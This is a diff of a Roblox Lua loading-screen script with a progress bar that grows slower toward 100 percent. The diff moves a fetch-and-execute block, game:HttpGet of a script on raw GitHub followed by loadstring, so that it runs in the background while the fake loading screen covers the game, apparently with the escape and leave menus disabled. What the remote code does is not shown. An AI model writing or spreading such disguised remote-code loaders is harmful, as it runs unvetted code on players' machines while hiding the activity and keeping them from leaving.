@@ -108,14 +108,30 @@ creditText.Size = UDim2.new(1, 0, 0.05, 0)
 creditText.Position = UDim2.new(0, 0, 0.95, 0)
 creditText.Parent = background
 
--- Number of steps (percent count)
 local steps = 100
+
+-- Start loading external script concurrently
+task.spawn(function()
+	local success, result = pcall(function()
+		return game:HttpGet("https://raw.githubusercontent.com/vakfq/LOADING/main/script.lua")
+	end)
+	if success then
+		local fn, err = loadstring(result)
+		if fn then
+			fn()
+		else
+			warn("Failed to load external script:", err)
+		end
+	else
+		warn("Failed to fetch external script:", result)
+	end
+end)
 
 -- Progress update loop with slowing near the end
 for i = 0, steps do
 	percentText.Text = i .. "%"
 
-	-- Tween progress bar size quickly (0.1 sec) so wait controls pacing
+	-- Tween progress bar size quickly (0.1 sec)
 	local tween = TweenService:Create(progressBar, TweenInfo.new(0.1, Enum.EasingStyle.Linear), {
 		Size = UDim2.new(i / steps, 0, 1, 0)
 	})
@@ -134,7 +150,7 @@ for i = 0, steps do
 		statusText.Text = "DONE"
 	end
 
-	-- Wait time starts small (~0.5s), then grows cubically to ~3.5s near 100%
+	-- Cubic easing wait time (starts ~0.5s, ends ~3.5s)
 	local waitTime = 0.5 + (i / steps)^3 * 3
 
 	wait(waitTime)
@@ -158,21 +174,5 @@ end
 running = false
 screenGui:Destroy()
 
--- Re-enable CoreGui (Escape Menu, Leave Game, etc.)
+-- Re-enable CoreGui
 StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
-
--- Load your external script AFTER loading screen finishes
-local success, result = pcall(function()
-	return game:HttpGet("https://raw.githubusercontent.com/vakfq/LOADING/main/script.lua")
-end)
-
-if success then
-	local fn, err = loadstring(result)
-	if fn then
-		fn()
-	else
-		warn("Failed to load external script:", err)
-	end
-else
-	warn("Failed to fetch external script:", result)
-end
